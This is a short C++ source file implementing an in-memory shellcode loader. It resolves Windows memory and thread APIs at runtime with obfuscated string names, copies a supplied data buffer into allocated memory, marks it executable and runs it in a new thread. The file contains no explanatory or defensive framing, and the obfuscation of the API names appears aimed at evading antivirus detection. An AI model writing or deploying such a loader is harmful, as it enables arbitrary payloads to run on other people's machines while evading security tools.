#include "Inject.h"

void Inject::injection(std::string data) {

	HMODULE kernel32 = LoadLibraryA(AY_OBFUSCATE("kernel32.dll"));
	HMODULE ntdll = LoadLibraryA(AY_OBFUSCATE("ntdll.dll"));

	virtaloc_def _VirtualAlloc = (virtaloc_def)GetProcAddress(kernel32, AY_OBFUSCATE("VirtualAlloc"));
	rtlmov_def _RtlMoveMemory = (rtlmov_def)GetProcAddress(ntdll, AY_OBFUSCATE("RtlMoveMemory"));
	virtprot_def _VirtualProtect = (virtprot_def)GetProcAddress(kernel32, AY_OBFUSCATE("VirtualProtect"));
	createthread_def _CreateThread = (createthread_def)GetProcAddress(kernel32, AY_OBFUSCATE("CreateThread"));
	waitforsingle_def _WaitForSingleObject = (waitforsingle_def)GetProcAddress(kernel32, AY_OBFUSCATE("WaitForSingleObject"));

	void* exec;
	BOOL rv;
	HANDLE hand;
	DWORD oldprotect = 0;

	exec = _VirtualAlloc(0, data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	_RtlMoveMemory(exec, data.c_str(), data.size());
	//DecodeBase64((const BYTE*)data.c_str(), data.size(), (char*)exec, data.size());

	rv = _VirtualProtect(exec, data.size(), PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		hand = _CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
		_WaitForSingleObject(hand, -1);
	}
}